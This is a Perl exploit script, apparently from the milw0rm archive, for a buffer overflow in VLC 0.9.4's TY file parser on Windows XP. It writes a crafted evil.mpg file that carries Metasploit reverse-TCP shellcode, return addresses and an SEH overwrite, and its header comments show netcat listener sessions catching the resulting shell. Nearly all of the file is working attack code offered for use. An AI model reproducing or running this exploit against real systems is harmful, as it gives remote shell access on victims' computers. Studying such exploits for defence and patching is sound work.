#!/usr/bin/perl
# 10/23/2008 k`sOSe
# Rewritten VLC 0.9.4 .TY File Buffer Overflow Exploit
# 1 - Works on Windows XP SP1, SP2, SP3 (and probably win2k)
# 2 - Works both with a local file and with a remote url
# 3 - VLC do not crash!
# 4 - Enjoy a respawing shell, even if VLC will be closed!
#
# bUGGEd htdocs # nc -l -p 443
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# e:\Program Files\VideoLAN\VLC>exit
# exit
# bUGGEd htdocs # nc -l -p 443
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# e:\Program Files\VideoLAN\VLC>exit
# exit
# bUGGEd htdocs # nc -l -p 443
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# e:\Program Files\VideoLAN\VLC>

use warnings;
use strict;

# windows/exec - 141 bytes
# http://www.metasploit.com
my $shellcode =
# windows/shell_reverse_tcp - 287 bytes
# http://www.metasploit.com
# EXITFUNC=seh, LPORT=443, LHOST=127.0.0.1
 "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24" .
 "\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f" .
 "\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84" .
 "\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28" .
 "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c" .
 "\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" .
 "\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e" .
 "\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" .
 "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50" .
 "\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff" .
 "\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43" .
 "\x53\x43\x53\xff\xd0\x68\x7f\x00\x00\x01\x66\x68\x01\xbb" .
 "\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff\xd6\x6a" .
 "\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a\x50" .
 "\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95" .
 "\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" .
 "\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51" .
 "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05" .
 "\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6" .
 "\x79\xff\x75\x04\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a" .
 "\x04\x5f\x53\xff\xd6\xff\xd0";

my $junk = "\x41";

open(my $file, "> evil.mpg");
print $file	"\xF5\x46\x7A\xBD" .	# TIVO_PES_FILEID    
		"\x00\x00\x00\x02" .	
		"\x00\x02\x00\x00" . 	# CHUNK_SIZE    
		$junk x 8 .
		"\x00\x00\x05\x41" .	# i_map_size
		$junk x 4 .
		"\x00\x00\x05\x49" .	# SEQ table size / (i_map_size + 8) == 1
		$junk x 60	.
		"\xb3\x57\x04\x7d"  .	# jmp esp for winxp sp2.. if it fails SEH will be triggered
		$shellcode .
		$shellcode .
		$junk x (733 - length($shellcode)) .
		"\xeb\x06\x90\x90" .	# jump ahead
		"\x13\x12\x54\x6a" .	# pop,pop,ret @ libvlc 0.9.4
		"\xe9\x16\xfd\xff\xff". # jump back
		$junk x 129943	.
		"\x05" .		# i_num_recs
		$junk x 3 .	
		"\x05" .		# p_hdrs
		$junk x 1 .
		"\x09" .		# subrec_type \ 
					#		(subrec type & 0x0f) << 8 | rec_type == 0x9c0 -> AC-3 Audio (DTivo)
		"\xc0" .		# rec_type    /
		$junk x 14 .
		"\x06" .		# subrec_type \
					#            	(subrec type & 0x0f) << 8 | rec_type == 0x6e0 -> Series 1 Tivo
		"\xe0" . 		# rec_type    /
		$junk x 531062;

# milw0rm.com [2008-10-23]
